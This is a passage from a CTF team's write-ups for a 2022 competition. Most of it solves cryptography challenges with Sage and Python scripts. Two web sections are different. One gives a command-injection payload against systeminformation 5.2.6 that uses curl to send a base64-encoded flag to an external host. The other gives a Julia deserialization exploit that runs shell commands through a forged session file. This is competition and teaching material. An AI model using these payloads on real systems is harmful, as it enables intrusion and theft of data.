root, exact = iroot(det, 2) if exact and (-b + root) % (2 * a) == 0: q1 = (-b + root) // (2 * a) p1 = n1 // q1 break d1 = invert(e1, (p1 - 1) * (q1 - 1)) c1 = open(\u0026#39;flag.txt.key1.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() print(long_to_bytes(pow(bytes_to_long(c1), d1, n1)).decode()) # Flag: and_this_is_just_some_random_string_to_make_the_flag_long_enough_308c8dfa144c4f41c3dfa06b5} Final Flag: TSJ{just_several_common_rsa_tricks_combined_together_in_a_single_guessy(?)_challenge_and_this_is_just_some_random_string_to_make_the_flag_long_enough_308c8dfa144c4f41c3dfa06b5}\nCompletely Secure Cryptography Solved by Mystiz; writeup compiled by Mystiz.\nWith some time of testing, I found that the output should be generated from:\n# \u0026#34;Encrypt\u0026#34;, of course def encrypt(m: bytes) -\u0026gt; str: c = m for _ in range(16): c = base64.b64encode(c) return c.decode().upper() It is observed in two ways:\n base64.b64decode(b'Vm0w') == b'Vm0'  This implies that the last step should be a \u0026quot;captialize\u0026quot; operation, and there are a bunch of base64-encode going on.  if we encode TSJ for 16 rounds, the prefix of its output and output.txt has the highest similarity (if we are case-insensitive).  Base64 is performed 16 rounds.   From this, we can easily guess byte by byte and see how many characters are matched. Doing this greedily doesn't necessarily give us the correct flag, but we can search through the string space by recursion.\nSolution script import base64 import string with open(\u0026#39;challenge/output.txt\u0026#39;) as f: c = f.read() def guess(m0=b\u0026#39;\u0026#39;, best=0): res = [] for u in string.printable.encode(): m1 = m0 + bytes([u]) m = m1 # Encodes the flag for _ in range(16): m = base64.b64encode(m) m = m.upper().decode() for i in range(best, len(c)): if m[i] != c[i]: break else: assert False, f\u0026#39;Done! The flag is {m1.decode()}\u0026#39; res.append((i, u)) res = sorted(res, reverse=True) if res[0][0] == best: return for best, b in res: m1 = m0 + bytes([b]) guess(m1, best) guess() # TSJ{A_Truly_Cursed_Challenge_kekw_xDoeEf+AVg\\XI[r`_w(S,~N2?Ba|tFRgsOvM]^ikhG\u0026#34;jcW|z~n\u0026amp; bCU$-qx4Z=;9/6lwLyzYm*TpuHQ.#Jj%1\u0026gt;)P0!d3@} Nimja at Nantou Solved by Kaiziron and Ozetta; writeup compiled by Kaiziron.\nThis is a challenge about bypassing the proxy and exploiting an outdated NodeJS library which is vulnerable to command injection.\nThe proxy will prevent some path to be accessed :\nmap /hello-from-the-world/key http://127.0.0.1:80/forbidden map /hello-from-the-world/ http://127.0.0.1:80 map /service-info/admin http://127.0.0.1:5000/forbidden map /service-info/ http://127.0.0.1:5000/ To exploit the command injection, we have to first get the key.\nThis path will return the key, if the request is made from 127.0.0.1 :\nget \u0026#34;/\u0026#34;: var jsonheader = parseJson($request.headers.toJson) var ip = $request.ip # If x-forwarded-for exists if haskey(jsonheader[\u0026#34;table\u0026#34;], \u0026#34;x-forwarded-for\u0026#34;): var ips = jsonheader[\u0026#34;table\u0026#34;][\u0026#34;x-forwarded-for\u0026#34;] ip = ips[ips.len-1].str if ip == \u0026#34;127.0.0.1\u0026#34;: resp getkey() else: resp \u0026#34;This is the index page.\\nOnly local user can get the key.\\n\u0026#34; In order to have a request made from 127.0.0.1, we can make a POST request to /get_hello :\npost \u0026#34;/get_hello\u0026#34;: var jsonheader = parseJson($request.params.toJson) var host = \u0026#34;\u0026#34; if haskey(jsonheader, \u0026#34;host\u0026#34;): host = jsonheader[\u0026#34;host\u0026#34;].str if host != \u0026#34;\u0026#34;: var response = hello_from_the_world(host) resp response else: resp \u0026#34;Please provide the host so that they can say hello to you.\\n\u0026#34; It can call the hello_from_the_world function, which will make the request to get the key we want, however it will append hello at the end of the URI :\nproc hello_from_the_world(host: string): string = var client = newHTTPClient(timeout=1000) var uri = host \u0026amp; \u0026#34;hello\u0026#34; var response = \u0026#34;\u0026#34; try: response = client.getContent(uri) except: response = \u0026#34;Cannot fetch hello from your designated host.\\n\u0026#34; return response We can add a ? at the end of the URI, so the hello it appended will be parsed as a parameter and won't affect the path.\nPOST /hello-from-the-world/get_hello HTTP/1.1 Host: 34.81.54.62:5487 Content-Type: application/x-www-form-urlencoded Content-Length: 26 host=http://localhost:80/? HTTP/1.1 200 OK Content-Length: 62 Server: ATS/9.1.0 Date: Sun, 27 Feb 2022 12:21:06 GMT Content-Type: text/html;charset=utf-8 Age: 0 Connection: keep-alive T$J_CTF_15_FUN_\u0026gt;_\u0026lt;_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag After getting the key, we can proceed to exploit the command injection.\nThe systeminformation library is version 5.2.6.\n// cat package.json { \u0026#34;name\u0026#34;: \u0026#34;service-info\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The package is for service-info from Nimja at Nantou\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;app.js\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;test\u0026#34;: \u0026#34;echo \\\u0026#34;Error: no test specified\\\u0026#34; \u0026amp;\u0026amp; exit 1\u0026#34; }, \u0026#34;author\u0026#34;: \u0026#34;l3o\u0026#34;, \u0026#34;license\u0026#34;: \u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;: { \u0026#34;systeminformation\u0026#34;: \u0026#34;5.2.6\u0026#34; } } It is outdated and vulnerable to command injection\nMore information about the vulnerability : https://vuldb.com/?id.169997 https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC\nThe si.services() function is vulnerable :\nfunction get_services(service) { return new Promise((res, reject) =\u0026gt; { si.services(service) .then(data =\u0026gt; { console.log(data); if (data != null) res(data.toString()); else res(\u0026#34;Failed\u0026#34;); }).catch(error =\u0026gt; { console.error(\u0026#34;Error: \u0026#34; + error); reject(\u0026#34;There is an error when fetching services.\u0026#34;); }) }); } The /admin path will call that get_services function :\nif (request.url == \u0026#34;/admin\u0026#34;) { if (request.method == \u0026#34;POST\u0026#34;) { if(body) { try { var jsonData = JSON.parse(body); var service = jsonData.service; var client_key = jsonData.key; } catch (e) { response.end(\u0026#34;ERROR\u0026#34;); return 1; } } if (client_key == KEY) { let return_data = await get_services(service); response.end(return_data); } else { console.log(\u0026#34;Key does not match.\\n\u0026#34;); response.end(\u0026#34;Only local users with the key can access the function.\\n\u0026#34;); } } else { response.end(\u0026#34;This is the admin page.\\n\u0026#34;); } } else if (request.url == \u0026#34;/forbidden\u0026#34;) { response.end(\u0026#34;Only local user can access it.\\n\u0026#34;); } else if (request.url == \u0026#34;/\u0026#34;) { response.end(\u0026#34;This is the index page.\\n\u0026#34;); } else { response.end(\u0026#34;404 Not Found\\n\u0026#34;); } That /admin path is blocked by the proxy, but using double slash can bypass it /service-info//admin\nThen just follow this POC and exploit the command injection to read the flag :\nhttps://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC\nPOST /service-info//admin HTTP/1.1 Host: 34.81.54.62:5487 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/json Content-Length: 159 {\u0026#34;service\u0026#34;:[\u0026#34;$(curl http://REDACTED/`base64 /flag`)\u0026#34;], \u0026#34;key\u0026#34;:\u0026#34;T$J_CTF_15_FUN_\u0026gt;_\u0026lt;_bY_Th3_wAy_IT_is_tHE_KEEEEEEEY_n0t_THE_flag\u0026#34;} GET /VFNKe0hSNV8xU19DMDAxX1hEX0wzdHNfZ29vb29vfQ== HTTP/1.1 Host: REDACTED User-Agent: curl/7.64.0 Accept: */* echo \u0026#34;VFNKe0hSNV8xU19DMDAxX1hEX0wzdHNfZ29vb29vfQ==\u0026#34; | base64 -d TSJ{HR5_1S_C001_XD_L3ts_gooooo} babyRSA Solved by grhkm and Mystiz; writeup compiled by Mystiz.\nChallenge Summary Let $p$ and $q$ be two primes of respectively 1024 bits and 512 bits. Denote $n = pq$ and define the elliptic curve $\\mathcal{C}$ by\n\\[\\mathcal{C}: \\quad y^2 \\equiv x^3 + px + q\\ (\\text{mod}\\ n).\\]\nLet $P = (x, y)$ be a point on $\\mathcal{C}$ with $\\text{flag}$ being 1536 bits long. Finally, we are given $Q$ with $Q = e \\cdot P$ ($e = 65537$). The goal is to recover $x$ (the padded flag).\nSolution Since $Q := (x_Q, y_Q)$ is on the elliptic curve $\\mathcal{C}$, we have\n\\[q + {x_Q}^3 - {y_Q}^2 + x_Q \\cdot p \\equiv 0\\ (\\text{mod}\\ n).\\]\nIf we multiply both sides by $q$, we have an quadratic congruence in $q$:\n\\[q^2 + ({x_Q}^3 - {y_Q}^2) \\cdot q + x_Q \\cdot n \\equiv 0\\ (\\text{mod}\\ n).\\]\nSince $q$ and $n$ are respectively 512 and 1536 bits, we have more information than unknowns. We can use LLL to recover $q$.\nAfter that, we can recover $P$ over $\\mathbb{Z}_p$ and $\\mathbb{Z}_q$ by considering the below elliptic curves:\n\\[\\begin{aligned} \u0026 \\mathcal{C}_p: \\quad y^2 \\equiv x^3 + px + q\\ (\\text{mod}\\ p) \\\\ \u0026 \\mathcal{C}_q: \\quad y^2 \\equiv x^3 + px + q\\ (\\text{mod}\\ q) \\end{aligned}\\]\nAlso, it would be easy for Sage to compute the order of those elliptic curves. In that way, we can find $d_p$ and $d_q$ such that\n\\[P = d_p \\cdot Q\\ (\\text{mod}\\ p) \\quad \\text{and} \\quad P = d_q \\cdot Q\\ (\\text{mod}\\ q).\\]\nFinally, we can use the Chinese remainder theorem to recover $P\\ \\text{mod}\\ n$. We have the flag by getting its $x$-coordinate:\nTSJ{i_don\u0026#39;t_know_how_to_come_up_with_a_good_flag_sorry} Solution script e = 65537 n = 1084688440161525456565761297723021343753253859795834242323030221791996428064155741632924019882056914573754134213933081812831553364457966850480783858044755351020146309359045120079375683828540222710035876926280456195986410270835982861232693029200103036191096111928833090012465092747472907628385292492824489792241681880212163064150211815610372913101079146216940331740232522884290993565482822803814551730856710106385508489039042473394392081462669609250933566332939789 Qx, Qy = (1079311510414830031139310538989364057627185699077021276018232243092942690870213059161389825534830969580365943449482350229248945906866520819967957236255440270989833744079711900768144840591483525815244585394421988274792758875782239418100536145352175259508289748680619234207733291893262219468921233103016818320457126934347062355978211746913204921678806713434052571635091703300179193823668800062505275903102987517403501907477305095029634601150501028521316347448735695, 950119069222078086234887613499964523979451201727533569872219684563725731563439980545934017421736344519710579407356386725248959120187745206708940002584577645674737496282710258024067317510208074379116954056479277393224317887065763453906737739693144134777069382325155341867799398498938089764441925428778931400322389280512595265528512337796182736811112959040864126090875929813217718688941914085732678521954674134000433727451972397192521253852342394169735042490836886) load(\u0026#39;coppersmith.sage\u0026#39;) bounds = (2^512, ) P.\u0026lt;q\u0026gt; = PolynomialRing(Zmod(n), 1) f = q^2 - q * (Qy^2 - Qx^3) roots = small_roots(f, bounds, m=7) for q0, in roots: q0 = int(q0) if q0 == 0: continue if n % q0 != 0: continue print(f\u0026#39;{q0 = }\u0026#39;) p0 = n // q0 Cp = EllipticCurve(Zmod(p0), [p0, q0]) op = Cp.order() print(f\u0026#39;{op = }\u0026#39;) dp = int(pow(e, -1, op)) print(f\u0026#39;{dp = }\u0026#39;) Qp = Cp(Qx, Qy) Pp = dp * Qp Cq = EllipticCurve(Zmod(q0), [p0, q0]) oq = Cq.order() print(f\u0026#39;{oq = }\u0026#39;) dq = int(pow(e, -1, oq)) print(f\u0026#39;{dq = }\u0026#39;) Qq = Cq(Qx, Qy) Pq = dq * Qq Ppx, Ppy = map(int, Pp.xy()) Pqx, Pqy = map(int, Pq.xy()) Px = int(crt([Ppx, Pqx], [p0, q0])) print(f\u0026#39;{Px = }\u0026#39;) for x in range(Px, 2**1536, n): flag = x.to_bytes(1536//8, \u0026#39;big\u0026#39;) print(f\u0026#39;{flag = }\u0026#39;) # TSJ{i_don\u0026#39;t_know_how_to_come_up_with_a_good_flag_sorry} Top Secret Solved by grhkm and Mystiz; writeup compiled by grhkm.\nWe are given the source code.\nclass Cipher: bs = 16 s = 0x6BF1B9BAE2CA5BC9C7EF4BCD5AADBC47 k = 0x5C2B76970103D4EEFCD4A2C681CC400D def __init__(self, key): self.key = key def _next(self): # replacing fast_forward with forward works too self.s = fast_forward(self.s, self.key, self.k) def ks(self, n): ks = b\u0026#34;\u0026#34; while len(ks) \u0026lt; n: self._next() ks += self.s.to_bytes(self.bs, \u0026#34;big\u0026#34;) return ks[:n] def encrypt(self, plaintext): return bytes(x ^ y for x, y in zip(plaintext, self.ks(len(plaintext)))) def decrypt(self, ciphertext): return self.encrypt(ciphertext) def forward(s, n, k): for _ in range(n): s = (s \u0026gt;\u0026gt; 1) ^ ((s \u0026amp; 1) * k) return s if __name__ == \u0026#34;__main__\u0026#34;: key = randbelow(2 ** 128) with open(\u0026#34;flag.png\u0026#34;, \u0026#34;rb\u0026#34;) as f: data = f.read() with open(\u0026#34;flag.png.enc\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(Cipher(key).encrypt(data)) As we can see, it is a stream cipher where the flag is xor'ed by a stream with a fixed state s. First, note that the first $16$ bytes, and thus the entire first \u0026quot;round\u0026quot; of bits, can be recovered by xor'ing the encrypted flag with the PNG header and the IHDR chunk. Further analysing the forward function, we see that it is essentially a Galois LFSR - in short, each time the LFSR shifts, the entire state is xor'ed by a key k. If we now represent the state as a vector $\\vec{s} \\in \\mathbb{F}_2^{128}$, we can see the forward operation is\n\\[f: \\begin{pmatrix} s_0 \\\\ s_1 \\\\ \\vdots \\\\ s_{126} \\\\ s_{127} \\end{pmatrix} \\mapsto \\begin{pmatrix} s_1 \\\\ s_2 \\\\ \\vdots \\\\ s_{127} \\\\ 0 \\end{pmatrix} \\oplus s_0 \\cdot \\vec{k}\\]\nWhere $\\vec{k}$ is the constant in the source code written as a binary vector. With some linear algebra, we can write this as a matrix multiplication $\\vec{s} \\mapsto M\\vec{s}$, but we got stuck here as we thought it is impossible to solve for $M^n\\vec{s} = \\vec{t}$, because of two reasons:\n We do not have the full matrix $M^n$ Even if we do, it is infeasible to calculate discrete logarithms of $128\\times 128$ matrices.  As it turns out, both the assumptions are incorrect. Firstly, due to the special nature of $M$ being the representation of a Galois LFSR, we can treat $\\vec{s}$ as an element of $\\mathbb{F}_{2^{128}}$, and more specifically as a polynomial. To motivate this, we can look at the following examples: (writing vectors in row form from $s_0$ to $s_{127}$)\n\\[\\begin{aligned} f(1, 0, 0, \\ldots, 0, 0) \u0026= (0, 1, 0, \\ldots, 0, 0) \\\\ f(0, 0, 1, \\ldots, 0, 0) \u0026= f(0, 0, 1, \\ldots, 0, 0) \\\\ \u0026\\vdots \\\\ f(0, 0, 0, \\ldots 1, 0) \u0026= f(0, 0, 0, \\ldots, 0, 1) \\\\ f(0, 0, 0, \\ldots, 0, 1) \u0026= \\vec{k} \\end{aligned}\\]\nFrom the cyclic nature of the operation, we can treat the vector $(s_0, s_1, \\ldots, s_{127})$ as polynomials in $\\mathbb{F}_{2^{128}}$ as $s_0 + s_1x + s_2x^2 + \\ldots + s_{127}x^{127}$ and $f(s) = xs$. Then since $x^{127}$ gets mapped to $k$ (as a polynomial), we can think of this as a modulo operation\n\\[f(s) = (xs\\mod x^{128} + k(x))\\]\nNow the idea is clear. With the first $16$ bytes i.e. $128$ bits of keystream, we can form a polynomial of the state $t$, and we get the equation\n\\[t \\equiv x^n s \\mod (x^{128} + k(x))\\]\nWe can directly compute the discrete logarithm $\\log_x(\\frac{t}{s})$. It is crucial to use pari's .fflog instead of sage's builtin .log method before Sage 9.5, as Sage uses generic PH-BSGS method to solve discrete logarithm in this case.\nThere is a final trick where $x^{128} + k(x)$ is not irreducible but instead is in the form of $xP(x)$. We simply consider discrete logarithm mod $P(x)$ and the rest follows as seen from the modulo relation.\nCode:\nk = 0x5C2B76970103D4EEFCD4A2C681CC400D init_s = 0x6BF1B9BAE2CA5BC9C7EF4BCD5AADBC47 def to_poly(s): return sum(((s \u0026gt;\u0026gt; i) \u0026amp; 1) * x^(127 - i) for i in range(128)) def to_int(r): return sum(int(x) \u0026lt;\u0026lt; (127 - i) for i, x in enumerate(r.coefficients(sparse=False))) R.\u0026lt;x\u0026gt; = PolynomialRing(GF(2), \u0026#39;x\u0026#39;) # from other png files png_header = 0x89504e470d0a1a0a0000000d49484452 # from flag.png.enc known = 0x9995611033e8bf22ae4defce1e53b92c cur_s = to_poly(png_header ^^ known) # extract modulus modulus = R((x^128 + to_poly(k)) / x) # setup fields and convert print(modulus.factor()) Q.\u0026lt;x\u0026gt; = GF(2^127, modulus=modulus) cur_sQ = Q(cur_s) init_sQ = Q(to_poly(init_s)) # discrete log dlog = ZZ(pari.fflog(Q(cur_sQ / init_sQ), Q(x))) print(f\u0026#34;{dlog = }\u0026#34;) assert Q(x)^dlog * init_sQ == Q(cur_sQ) # however, calculations have to be done in the original modulus modulus *= R(x) cur_s = R(to_poly(init_s)) # decrypt flag enc = open(\u0026#39;flag.png.enc\u0026#39;, \u0026#39;rb\u0026#39;).read() keystream = b\u0026#34;\u0026#34; while len(keystream) \u0026lt; len(enc): cur_s = cur_s * pow(R(x), dlog, modulus) % modulus keystream += to_int(cur_s).to_bytes(16, \u0026#34;big\u0026#34;) dec = bytes([x ^^ y for x, y in zip(enc, keystream)]) open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;).write(dec) Flag: TSJ{discrete_log_in_a_finite_field}\nRNG++ Solved by Mystiz; writeup compiled by grhkm and Mystiz.\nChallenge Summary Suppose that we have a linear congruence generator $s_{k+1} = (a \\cdot s_k + c)\\ (\\text{mod}\\ m)$ for all $k \\geq 0$. We have a transcript file that contains $m$, $a$ and $c$ ($a$ and $c$ are primes less than $m$). We are also given a number of ciphertexts. The $k$-th ciphertext $c_k$ ($k \\geq 1$) is computed by:\n\\[c_k = m_k \\oplus s_k.\\]\nHere $m_k$ is the $k$-th message. $m_1$ is the flag with length $l$ and $m_2, m_3, ...$ are strings of length $l$ those contain digits only (for example, m2 = b\u0026quot;133765536\u0026quot;). The goal is to recover $m_1$.\nIn this challenge, the parameters are given below:\nl = 32 # m = 2^256 m = 115792089237316195423570985008687907853269984665640564039457584007913129639936 a = 86063744400850297667628777812749377798737932751281716573108946773081904916117 c = 64628347935200268328771003490390752890895505335867420334664237461501166025747 ciphertexts = [ 0x59fe4b12f3f85e6756189ba75cc7bfc6ebc5b9a9e0f008623dd008f9632927c2, 0x413c3d70d09e08d2e5b10b51800b65571f3afde82ca233351cddae591c3996d2, 0xea4aac7bf92c87cad6584d4cd8337af93afc2fd42314c02298afcdd26ec42771, 0x8c6425226df355ccd09cc5c968b3cfa8fd606179346a66841ee5b7f6e6425409, 0x16cd6c30d1bff2dc1ba2e6257fb37fd5c477d0952e254aa3c5c301b0e43846c8 ] Solution As noted, we notice that the random strings $m_i, i\\geq 2$ consists of digits only. We further note that since the modulus $m = 2^{256}$ is a power of $2$, we have that\n\\[m_1 \\oplus (AS + C) \\equiv c_1 \\mod 2^{256}\\]\n\\[\\implies \\begin{cases} m_1[:1] \\oplus (AS + C\\mod 2^8) \u0026\\equiv c_1 \\mod 2^8 \\\\ m_1[:2] \\oplus (AS + C\\mod 2^{16}) \u0026\\equiv c_1 \\mod 2^{16} \\\\ m_1[:3] \\oplus (AS + C\\mod 2^{24}) \u0026\\equiv c_1 \\mod 2^{24} \\\\ \u0026\\vdots \\end{cases}\\]\nWhere $S' \\in [0, 2^{8i}]$ is the restricted $S$, and equations are similar for $m_2, m_3, m_4$. Therefore, we can test $i = 1, 2, \\ldots, 32$, bruteforce the corresponding character $c_1[i]$ (which has $10$ choices), and use recursion.\nSolution script m = 2**256 a = 86063744400850297667628777812749377798737932751281716573108946773081904916117 c = 64628347935200268328771003490390752890895505335867420334664237461501166025747 cs = [ 0x59fe4b12f3f85e6756189ba75cc7bfc6ebc5b9a9e0f008623dd008f9632927c2, 0x413c3d70d09e08d2e5b10b51800b65571f3afde82ca233351cddae591c3996d2, 0xea4aac7bf92c87cad6584d4cd8337af93afc2fd42314c02298afcdd26ec42771, 0x8c6425226df355ccd09cc5c968b3cfa8fd606179346a66841ee5b7f6e6425409, 0x16cd6c30d1bff2dc1ba2e6257fb37fd5c477d0952e254aa3c5c301b0e43846c8, ] nums = set(b\u0026#39;0123456789\u0026#39;) def attempt(current=0, progress=0): if progress == 32: m1 = current s1 = m1 ^ cs[1] s0 = pow(a, -1, m) * (s1 - c) % m m0 = s0 ^ cs[0] flag = int.to_bytes(m0, progress, \u0026#39;big\u0026#39;) print(f\u0026#39;{flag = }\u0026#39;) return mod = 256**(progress + 1) for x in range(10): m1 = current + 256**progress * (0x30 + x) s1 = (m1 ^ cs[1]) % mod s2 = (a * s1 + c) % mod m2 = (s2 ^ cs[2]) % mod if set(int.to_bytes(m2, progress+1, \u0026#39;big\u0026#39;)) | nums != nums: continue s3 = (a * s2 + c) % mod m3 = (s3 ^ cs[3]) % mod if set(int.to_bytes(m3, progress+1, \u0026#39;big\u0026#39;)) | nums != nums: continue s4 = (a * s3 + c) % mod m4 = (s4 ^ cs[4]) % mod if set(int.to_bytes(m4, progress+1, \u0026#39;big\u0026#39;)) | nums != nums: continue attempt(m1, progress+1) attempt() # TSJ{this_is_a_boring_challenge_sorry} RNG+++ Solved by Mystiz; writeup compiled by Mystiz.\nChallenge Summary The challenge has the same setting as RNG++ with a different set of parameters:\nl = 24 # m = 2^192 + 133 = NextPrime(2^192) m = 6277101735386680763835789423207666416102355444464034513029 a = 5122535491606943208710238231068027098883286375061143870757 c = 3210047385276654404868184757570927620150853542689320481571 ciphertexts = [ 0x0b8bb965128d77d56f2efc1b7ec640699927dbb711d13a41, 0x5c894788bdf78b2b7bf4081270ebb495b95c90ab6a7fb3f0, 0x737d9ea03e9fd30eeb2176aa588480c0b798682a7f4013fc, 0x299bd16cef01a65b467d5e3dfd46ec62b4e29f8994b1a4c0, 0xaa9b3e5f5635b7cab0eaa50aa854223975bfc10976a5b198, 0xdfdcac905116a9f8ac0fb9bdf8da193616b58713daa7dade, 0x520b8ea46a7ad0a590064b6f067b9b3962c4874541eb34f0, 0xa490b4afaf268540b0ecafff938b4531ad06b5706a4d68e6, 0x087726f7bf592ad0ee92e78773dc860f4975766f382bf192 ] Solution The idea is similar to Signature, which attempts to remove XOR operations of a relation and convert it to affine relation. The below script would recover the seed $s_0$ from ciphertexts.\nThe weights are pretty hard to set though\u0026hellip; @maple3142 used BKZ and it would return a better set of vectors, effectively recovering $s_0$ without much configuration to the weights.  After we have the seed recovered from LLL, we can decrypt $c_1$ and yield the flag:\nTSJ{sorry_for_the_broken_ver} Solution script m = 6277101735386680763835789423207666416102355444464034513029 # 2^192 + 133 a = 5122535491606943208710238231068027098883286375061143870757 c = 3210047385276654404868184757570927620150853542689320481571 cs = list(map(int, [ 0x0b8bb965128d77d56f2efc1b7ec640699927dbb711d13a41, 0x5c894788bdf78b2b7bf4081270ebb495b95c90ab6a7fb3f0, 0x737d9ea03e9fd30eeb2176aa588480c0b798682a7f4013fc, 0x299bd16cef01a65b467d5e3dfd46ec62b4e29f8994b1a4c0, 0xaa9b3e5f5635b7cab0eaa50aa854223975bfc10976a5b198, 0xdfdcac905116a9f8ac0fb9bdf8da193616b58713daa7dade, 0x520b8ea46a7ad0a590064b6f067b9b3962c4874541eb34f0, 0xa490b4afaf268540b0ecafff938b4531ad06b5706a4d68e6, 0x087726f7bf592ad0ee92e78773dc860f4975766f382bf192, ])) n = len(cs)-1 P.\u0026lt;s0\u0026gt; = PolynomialRing(GF(m)) ss = [s0] while len(ss)-1 \u0026lt;= len(cs): ss.append(a * ss[-1] + c) try: ss[-1] = ss[-1] % m except: pass ss = ss[1:] MASK = int.from_bytes(b\u0026#39;0\u0026#39;*24, \u0026#39;big\u0026#39;) weights = [2^256 for _ in range(8)] # all zeros weights += [2^192, 1] # 1, s0 (192 bit) weights += [2^192 for _ in range(24*8)] # rki\u0026#39;s (-15 ~ 15) A = Matrix(ZZ, 2 + 25*n) Q = diagonal_matrix(weights) for j in range(n): vj, uj = map(int, ss[j+1].coefficients()) if True: A[0, j] = vj - (cs[j+1]^^MASK) A[1, j] = uj for i in range(24): A[2+24*j+i, j] = 256**i if True: A[2+24*n+j, j] = m for i in range(2 + 24*n): A[i, n+i] = 1 A *= Q A = A.LLL() A /= Q for row in A: if list(row[:n]) != [0 for _ in range(n)]: continue if row[n] \u0026lt; 0: row = -row if row[n] != 1: continue s0 = int(row[n+1] % m) rs = row[n+2:] if min(rs) \u0026lt; -15: continue if max(rs) \u0026gt; 15: continue print(f\u0026#39;{s0 = }\u0026#39;) print(f\u0026#39;{rs = }\u0026#39;) print() Genie Solved by grkhm, Mystiz and Ozetta; writeup compiled by Mystiz and Ozetta.\nThe challenge is a website developed using Genie Framework, which is based on Julia. The website allows user to upload files and it stores the file list to the session.\nThe first steps From Mystiz's perspective\nI noticed this challenge after it is tagged with \u0026quot;crypto\u0026quot;. Since the source code for the web server (main.jl) is pretty short, I suspect that we should be looking for a bug from the Genie framework.\nOne use of crypto in Genie is their cookie-session management. In short, cookies are ciphertexts of the session ID. The session ID corresponds to a file in the /app/sessions folder. In pseudocode:\n# key and iv are fixed cookie = aes_cbc_encrypt(plaintext=session_id, key=key, iv=iv) session_file = \u0026#39;/app/sessions/\u0026#39; + session_id Seeing AES-CBC is being used, I suspected that there is a padding oracle vulnerability... After that, I deployed an instance locally with key and IV hardcoded. I found that we can set the session ID to be ../uploads/session.txt and it would read my uploaded session.txt as the session content. I drafted an attack flow and get the web guy (the unbeatable Ozetta) involved:\n Upload session.txt with a malicious session that will copy the flag to uploads/session.txt Set the session to point to ../uploads/session.txt Visit the page for the command in the session to execute Go to http://[HOST]/uploads/flag for the flag  By the way, grhkm asked if we could upload a file called ../f early on. I quickly rejected his idea. I was so wrong... More on that later.\nCrafting a malicious session file From Ozetta's perspective\nMystiz et al. found that the session id stored in cookies (__geniesid) is an encrypted filename of the session file in the server. The encryption is using a secret token, which is random whenever the server instance is created:\nGenie.secret_token!(sha256(randstring(256)) |\u0026gt; bytes2hex) Apparently we need to specify the __geniesid to point to the file we uploaded to do something interesting. What kind of thing we should do? We found that the sesion file is in a serialized format that starts with \u0026quot;7JL\u0026quot;: https://docs.julialang.org/en/v1/stdlib/Serialization/ So probably it is some kind of deserialization and trigger RCE like the pickle in python or POP chain in PHP: https://cwe.mitre.org/data/definitions/502.html Let's search for this in Julia and see whether there are some PoCs already. It turns out that there is an issue in GitHub opened since 2019... lol https://github.com/JuliaLang/julia/issues/32601 To test the PoC, we first run the code stated in the issue on the local server, and then replace the session file we found on the local server to the PoC outputed file, and then visit the home page to trigger the session loading. Then we see this in the error log:\nweb_1 | ┌ Error: KeyError(:REQUEST) web_1 | └ @ Genie.AppServer ~/.julia/packages/Genie/drXWm/src/AppServer.jl:120 web_1 | 2022/02/27 15:43:01 [error] 16#16: *6 upstream prematurely closed connection while reading response header from upstream, client: 172.27.0.1, server: , request: \u0026#34;GET / HTTP/1.1\u0026#34;, upstream: \u0026#34;http://127.0.0.1:8888/\u0026#34;, host: \u0026#34;localhost:8888\u0026#34; web_1 | root:x:0:0:root:/root:/bin/bash web_1 | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin web_1 | bin:x:2:2:bin:/bin:/usr/sbin/nologin web_1 | sys:x:3:3:sys:/dev:/usr/sbin/nologin ... It works pretty well! Since it only shows the execution result in the error log, probably we need to set up a requestbin to catch the flag after RCE. But to be more convenient to our team members, we can just copy the flag to the uploads folder on the server and then use the native feature to download the flag, so we don't even need external connection lol. Here is the exploit code based on the PoC:\nusing Serialization Serialization.deserialize(s::Serializer, t::Type{BigInt})=run(`sh -c \u0026#39;cp /app/flag* /app/uploads/flag\u0026#39;`); filt=filter(methods(Serialization.deserialize).ms) do m String(m.file)[1]==\u0026#39;R\u0026#39; end; Serialization.serialize(\u0026#34;poc.serialized_jl\u0026#34;, (filt[1], BigInt(7))); The only difference is the command. For some reason you cannot directly use special character when you use the run function (or maybe a language construct? I don't even know wtf is that... lol). The special characters need to be quoted. So if you just use cp /app/flag* /app/uploads/flag then it will try to copy the file called flag* instead of the actual flag file with random file name. So we need to use sh -c here.\nAfter that we need to fix the crypto part.\nThe server is slow due to weird behavior of nginx, and it just has 600 seconds timeout.\nFinding the actual crypto bug From Mystiz's perspective\nI thought it was a padding oracle, but it is not. Let's read the source code on how a session ID is converted to a cookie:\n# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/session_adapters/FileSession.jl#L68-L89 \u0026#34;\u0026#34;\u0026#34; read(session_id::Union{String,Symbol}) :: Union{Nothing,Genie.Sessions.Session} read(session::Genie.Sessions.Session) :: Union{Nothing,Genie.Sessions.Session} Attempts to read from file the session object serialized as `session_id`. \u0026#34;\u0026#34;\u0026#34; function read(session_id::Union{String,Symbol}) :: Union{Nothing,Genie.Sessions.Session} isfile(joinpath(SESSIONS_PATH, session_id)) || return nothing try open(joinpath(SESSIONS_PATH, session_id), \u0026#34;r\u0026#34;) do (io) Serialization.deserialize(io) end catch ex @error \u0026#34;Can\u0026#39;t read session\u0026#34; @error ex end end function read(session::Genie.Sessions.Session) :: Union{Nothing,Genie.Sessions.Session} read(session.id) end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Sessions.jl#L59-L71 \u0026#34;\u0026#34;\u0026#34; id(payload::Union{HTTP.Request,HTTP.Response}) :: String Attempts to retrieve the session id from the provided `payload` object. If that is not available, a new session id is created. \u0026#34;\u0026#34;\u0026#34; function id(payload::Union{HTTP.Request,HTTP.Response}) :: String (Genie.Cookies.get(payload, Genie.config.session_key_name) !== nothing) \u0026amp;\u0026amp; ! isempty(Genie.Cookies.get(payload, 